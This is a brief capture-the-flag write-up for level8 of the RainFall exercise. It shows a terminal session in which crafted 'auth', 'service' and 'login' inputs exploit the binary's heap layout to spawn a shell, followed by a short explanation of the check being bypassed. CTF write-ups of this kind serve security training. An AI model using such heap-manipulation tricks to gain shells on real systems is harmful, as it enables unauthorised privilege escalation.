After dissassemble the binary, we understood that we have to send this :

level8@RainFall:~$ ./level8 
(nil), (nil) 
auth abcdefghijklmnopqrstuvwxyz
0x804a008, (nil) 
serviceaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
0x804a008, 0x804a018 
login
$

the binary make a system('/bin/bash') when the first condition is respected
and when we send "service" 
the binary verifies that during the "login"
the 32nd character is not 0.
